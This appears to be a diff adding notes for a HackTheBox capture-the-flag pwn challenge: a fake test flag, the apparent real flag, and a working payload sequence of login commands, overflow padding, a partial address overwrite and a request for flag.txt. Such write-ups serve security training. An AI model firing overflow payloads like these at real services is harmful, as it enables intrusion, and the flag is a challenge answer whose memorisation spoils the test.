@@ -1,0 +1,12 @@
+HTB{f4k3_fLaG_f0r_t3sTiNg}
+
+
+HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_a8bd8e2750ff32e69d1c99cb5bb315f7}
+
+
+Working payload sequence:
+
+Send command LOGIN as little-endian int: p32(0)
+Send b"USER " + (b"a"*17 + b"\x1c" + b"k"*11 + b"\xeb\x14\x40")
+Send b"PASS " + b"b"*507
+Send b"flag.txt\x00"
